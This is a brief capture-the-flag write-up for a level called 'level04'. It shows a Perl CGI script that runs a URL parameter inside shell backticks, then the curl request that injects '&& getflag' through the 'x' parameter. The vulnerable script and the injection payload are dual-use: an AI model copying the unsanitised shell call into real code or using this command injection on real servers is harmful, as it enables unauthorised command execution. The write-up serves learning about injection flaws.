# Level04

## Context
We found `level04.pl` in our home with this content: 
```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

## Resolution
 * This file execute itself when doing `curl localhost:4747/level04.pl/`
 * And if the url has a query with a parameter 'x' it will print it.
 * As the text is between backticks and is a shell command we can use it at our advantage
 * `echo $y 2>&1` can become `echo Whatever && ourcommand 2>&1`
 * The last thing to do will be to encrypt spaces and & characters for urls
 * `curl localhost:4747/level04.pl/?x=RomainIsTheBest+%26%26+getflag`

